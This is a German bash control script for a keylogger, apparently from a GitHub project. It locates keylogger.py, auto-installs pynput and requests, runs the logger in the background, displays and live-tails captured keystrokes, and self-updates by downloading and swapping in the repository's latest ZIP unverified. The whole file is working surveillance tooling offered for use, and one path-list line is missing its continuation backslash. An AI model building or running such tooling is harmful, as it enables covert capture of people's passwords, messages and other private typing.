#!/bin/bash
# keylogger-ctl.sh – Steuerung + Update-Check für den Keylogger
# Sucht keylogger.py in ~/Downloads (Fallback: ~/Scripts, ~/Desktop, ~/Documents)
# Prüft Python-Abhängigkeiten und installiert fehlende automatisch.

PIDFILE="/tmp/keylogger.pid"
OUTLOG="/tmp/keylogger.out.log"
ERRLOG="/tmp/keylogger.err.log"
LOG_DIR="$HOME/Documents/KeyLogs"

# Update-Konfiguration
GITHUB_REPO="lzwdev/Keylogger"
GITHUB_BRANCH="main"
ZIP_URL="https://github.com/${GITHUB_REPO}/archive/refs/heads/${GITHUB_BRANCH}.zip"
INFO_FILE="info.txt"
PROJECT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

REQUIRED_PY_MODULES=("requests" "pynput")

# ---------- Python-Skript finden ----------
find_py() {
    for cand in \
        "$HOME/Downloads/keylogger.py" \
        "$HOME/Scripts/keylogger.py" \
        "$HOME/Desktop/keylogger.py" \
		"$HOME/Downloads/Keylogger/keylogger.py" \
		"$HOME/Documents/Keylogger/keylogger.py" \
		"$HOME/Desktop/Keylogger/keylogger.py" \
        "$HOME/Documents/keylogger.py"
		"$HOME/Keylogger/keylogger.py" \
    do
        [ -f "$cand" ] && { echo "$cand"; return 0; }
    done
    return 1
}

PY=$(find_py)

# ---------- Update-Check ----------
# Liest die lokale info.txt (Format: version=1.0.0)
get_local_version() {
    local info="$PROJECT_DIR/$INFO_FILE"
    if [ -f "$info" ]; then
        grep -E '^version=' "$info" | cut -d'=' -f2 | tr -d '[:space:]'
    else
        echo ""
    fi
}

# Holt die neueste Version aus dem GitHub-Repo (via raw info.txt auf main)
get_remote_version() {
    local raw_url="https://raw.githubusercontent.com/${GITHUB_REPO}/${GITHUB_BRANCH}/${INFO_FILE}"
    curl -fsSL "$raw_url" 2>/dev/null | grep -E '^version=' | cut -d'=' -f2 | tr -d '[:space:]'
}

# Zeigt Update-Status und führt bei Bedarf das Update aus
check_update() {
    echo "═══════════════════════════════════════"
    echo " UPDATE-CHECK"
    echo "═══════════════════════════════════════"

    local local_ver
    local_ver="$(get_local_version)"

    if [ -z "$local_ver" ]; then
        echo "[!] Keine lokale info.txt gefunden in: $PROJECT_DIR"
        echo "    Erwartet: $INFO_FILE mit Inhalt 'version=x.y.z'"
        return 1
    fi

    echo "[i] Lokale Version:  $local_ver"
    echo "[i] Prüfe Remote …"

    local remote_ver
    remote_ver="$(get_remote_version)"

    if [ -z "$remote_ver" ]; then
        echo "[!] Remote-Version konnte nicht gelesen werden."
        echo "    Prüfe Internetverbindung und ob info.txt im Repo existiert."
        return 1
    fi

    echo "[i] Remote Version:  $remote_ver"

    if [ "$local_ver" = "$remote_ver" ]; then
        echo
        echo "[✓] Du bist auf dem neuesten Stand (Version $local_ver)."
        return 0
    fi

    echo
    echo "[!] Update verfügbar: $local_ver → $remote_ver"
    echo

    # Download in Temp-Ordner
    local tmp_dir
    tmp_dir="$(mktemp -d /tmp/keylogger-update.XXXXXX)" || { echo "[!] Temp-Ordner fehlgeschlagen."; return 1; }

    local zip_path="$tmp_dir/keylogger.zip"
    echo "[i] Lade ZIP herunter …"

    # Größe vorab ermitteln (Content-Length)
    local size_bytes
    size_bytes=$(curl -sIL "$ZIP_URL" 2>/dev/null | grep -i '^content-length:' | tail -1 | tr -dc '0-9')
    if [ -n "$size_bytes" ] && [ "$size_bytes" -gt 0 ] 2>/dev/null; then
        local size_human
        size_human=$(echo "$size_bytes" | awk '{printf "%.1f MB", $1/1024/1024}')
        echo "[i] Dateigröße: $size_human"
    fi

    if ! curl -fL --progress-bar -o "$zip_path" "$ZIP_URL"; then
        echo "[!] Download fehlgeschlagen."
        rm -rf "$tmp_dir"
        return 1
    fi

    echo "[✓] Download abgeschlossen."

    # Entpacken
    echo "[i] Entpacke …"
    if ! unzip -qo "$zip_path" -d "$tmp_dir"; then
        echo "[!] Entpacken fehlgeschlagen."
        rm -rf "$tmp_dir"
        return 1
    fi

    # Entpackter Ordner heißt normalerweise Keylogger-main
    local extracted
    extracted=$(find "$tmp_dir" -maxdepth 1 -type d -name "Keylogger-*" | head -1)
    if [ -z "$extracted" ]; then
        echo "[!] Entpackter Ordner nicht gefunden."
        rm -rf "$tmp_dir"
        return 1
    fi

    # Alten Ordner sichern (falls etwas schiefgeht)
    local backup_dir="${PROJECT_DIR}.bak.$(date +%Y%m%d%H%M%S)"
    echo "[i] Ersetze Projektordner …"

    # Aktuellen Ordner verschieben (nicht löschen, für den Fall der Fälle)
    if ! mv "$PROJECT_DIR" "$backup_dir"; then
        echo "[!] Konnte alten Ordner nicht verschieben."
        rm -rf "$tmp_dir"
        return 1
    fi

    # Neuen Ordner an die Stelle des alten verschieben
    if ! mv "$extracted" "$PROJECT_DIR"; then
        echo "[!] Konnte neuen Ordner nicht einsetzen. Stelle Backup wieder her …"
        mv "$backup_dir" "$PROJECT_DIR"
        rm -rf "$tmp_dir"
        return 1
    fi

    # Aufräumen
    rm -rf "$tmp_dir"
    echo "[✓] Update abgeschlossen: $local_ver → $remote_ver"
    echo "    Backup des alten Ordners: $backup_dir"
    echo "    (Kann gelöscht werden, wenn alles läuft.)"
    echo
    echo "[i] Bitte starte das Bash-Skript neu, damit die neue Version aktiv wird."
    return 0
}

# ---------- Python / Abhängigkeiten ----------
python_ok() {
    command -v python3 >/dev/null 2>&1
}

module_installed() {
    python3 - "$1" <<'PYEOF' >/dev/null 2>&1
import importlib, sys
try:
    importlib.import_module(sys.argv[1])
except Exception:
    sys.exit(1)
PYEOF
}

pip_available() {
    python3 -m pip --version >/dev/null 2>&1
}

ensure_dependencies() {
    if ! python_ok; then
        echo "[!] python3 nicht gefunden. Bitte installieren (z. B. via Homebrew: brew install python)."
        return 1
    fi

    local missing=()
    for m in "${REQUIRED_PY_MODULES[@]}"; do
        if module_installed "$m"; then
            echo "[✓] Python-Modul vorhanden: $m"
        else
            echo "[!] Fehlt: $m"
            missing+=("$m")
        fi
    done

    if [ ${#missing[@]} -eq 0 ]; then
        echo "[✓] Alle Abhängigkeiten vorhanden."
        return 0
    fi

    if ! pip_available; then
        echo "[!] pip nicht verfügbar. Bitte manuell installieren:"
        echo "    python3 -m ensurepip --upgrade"
        return 1
    fi

    echo
    echo "[i] Installiere fehlende Module: ${missing[*]}"
    if python3 -m pip install --user "${missing[@]}"; then
        echo "[✓] Installation abgeschlossen."
    else
        echo "[!] Installation fehlgeschlagen."
        echo "    Tipp: venv verwenden:"
        echo "      python3 -m venv ~/.venvs/keylogger"
        echo "      ~/.venvs/keylogger/bin/pip install ${missing[*]}"
        return 1
    fi

    local still_missing=()
    for m in "${missing[@]}"; do
        module_installed "$m" || still_missing+=("$m")
    done
    if [ ${#still_missing[@]} -gt 0 ]; then
        echo "[!] Weiterhin fehlend: ${still_missing[*]}"
        echo "    Tipp: pip aktualisieren: python3 -m pip install --upgrade pip"
        return 1
    fi
    echo "[✓] Alle Abhängigkeiten vorhanden."
    return 0
}

# ---------- Prozess-Steuerung ----------
is_running() {
    [ -f "$PIDFILE" ] || return 1
    PID=$(cat "$PIDFILE" 2>/dev/null)
    [ -n "$PID" ] && kill -0 "$PID" 2>/dev/null
}

status_line() {
    if is_running; then
        echo "● LÄUFT (PID $(cat "$PIDFILE"))"
    else
        echo "○ GESTOPPT"
    fi
}

start_kl() {
    if [ -z "$PY" ]; then
        echo "[!] keylogger.py nicht gefunden."
        echo "    Erwartet in: ~/Downloads, ~/Scripts, ~/Desktop, ~/Documents"
        return
    fi
    if is_running; then
        echo "[i] Läuft bereits (PID $(cat "$PIDFILE"))."
        return
    fi

    echo "[i] Prüfe Python-Abhängigkeiten…"
    if ! ensure_dependencies; then
        echo "[!] Start abgebrochen – Abhängigkeiten unvollständig."
        return
    fi

    echo
    echo "[i] Starte im Hintergrund…"
    nohup python3 "$PY" >"$OUTLOG" 2>"$ERRLOG" &
    echo $! > "$PIDFILE"
    sleep 1
    if is_running; then
        echo "[✓] Gestartet (PID $(cat "$PIDFILE"))"
        echo "    Skript: $PY"
    else
        echo "[!] Start fehlgeschlagen. Siehe $ERRLOG:"
        tail -n 5 "$ERRLOG"
        rm -f "$PIDFILE"
    fi
}

stop_kl() {
    if ! is_running; then
        echo "[i] War nicht aktiv."
        rm -f "$PIDFILE"
        return
    fi
    PID=$(cat "$PIDFILE")
    kill "$PID" 2>/dev/null
    sleep 1
    kill -0 "$PID" 2>/dev/null && kill -9 "$PID" 2>/dev/null
    rm -f "$PIDFILE"
    echo "[✓] Gestoppt."
}

show_status() {
    echo "═══════════════════════════════════════"
    echo " STATUS"
    echo "═══════════════════════════════════════"
    echo " Dienst:  $(status_line)"
    echo " Skript:  ${PY:-<nicht gefunden>}"
    echo " Logs:    $LOG_DIR"
    echo " Version: $(get_local_version || echo 'unbekannt')"
    if [ -s "$ERRLOG" ]; then
        echo " Letzte Fehler:"
        tail -n 3 "$ERRLOG" | sed 's/^/   /'
    fi
    echo
}

show_history() {
    if [ ! -d "$LOG_DIR" ]; then
        echo "[!] Kein Log-Ordner: $LOG_DIR"
        return
    fi
    LATEST=$(ls -t "$LOG_DIR"/keys_*.log 2>/dev/null | head -n1)
    if [ -z "$LATEST" ]; then
        echo "[!] Noch keine Logdatei in $LOG_DIR"
        return
    fi
    echo "═══════════════════════════════════════"
    echo " TASTENDRÜCKE – $(basename "$LATEST")"
    echo "═══════════════════════════════════════"

    python3 - "$LATEST" <<'PYEOF'
import json, sys
from collections import Counter

path = sys.argv[1]
rows = []
with open(path, encoding="utf-8") as f:
    for line in f:
        line = line.strip()
        if not line:
            continue
        try:
            rows.append(json.loads(line))
        except Exception:
            continue

presses = [r for r in rows if r.get("event") == "press"]
print(f" Gesamt: {len(rows)} Einträge | Tastendrücke: {len(presses)}")
print()
print(f"{'Zeit':<10} {'Taste':<20}")
print("-" * 32)
for r in presses[-40:]:
    key = r.get("key", "").replace("Key.", "").replace("'", "")
    print(f"{r.get('time',''):<10} {key:<20}")

print()
print(" Häufigste Tasten:")
for k, v in Counter(r.get("key","") for r in presses).most_common(10):
    k2 = k.replace("Key.", "").replace("'", "")
    print(f"   {k2:<20} {v}x")
PYEOF
    echo
    echo " Datei: $LATEST"
    echo
}

follow_live() {
    if [ ! -d "$LOG_DIR" ]; then
        echo "[!] Kein Log-Ordner: $LOG_DIR"
        return
    fi
    LATEST=$(ls -t "$LOG_DIR"/keys_*.log 2>/dev/null | head -n1)
    [ -z "$LATEST" ] && { echo "[!] Keine Logdatei."; return; }
    echo "[i] Live: $LATEST  (Strg+C zum Beenden)"
    tail -f "$LATEST"
}

# ---------- Menü ----------
while true; do
    clear
    echo "═══════════════════════════════════════"
    echo "   KEYLOGGER STEUERUNG"
    echo "═══════════════════════════════════════"
    echo " Status: $(status_line)"
    echo " Version: $(get_local_version || echo 'unbekannt')"
    echo " Skript: ${PY:-<nicht gefunden>}"
    echo "───────────────────────────────────────"
    echo "  1) Starten"
    echo "  2) Stoppen"
    echo "  3) Status"
    echo "  4) Verlauf (Übersicht)"
    echo "  5) Live-Verlauf"
    echo "  6) Abhängigkeiten prüfen/installieren"
    echo "  7) Nach Updates suchen"
    echo "  q) Beenden"
    echo "───────────────────────────────────────"
    read -rp " Auswahl: " choice
    echo
    case "$choice" in
        1) start_kl; read -rp "Enter…" _ ;;
        2) stop_kl;  read -rp "Enter…" _ ;;
        3) show_status; read -rp "Enter…" _ ;;
        4) show_history; read -rp "Enter…" _ ;;
        5) follow_live ;;
        6) ensure_dependencies; read -rp "Enter…" _ ;;
        7) check_update; read -rp "Enter…" _ ;;
        q|Q) exit 0 ;;
        *) echo "[!] Ungültig."; sleep 1 ;;
    esac
done
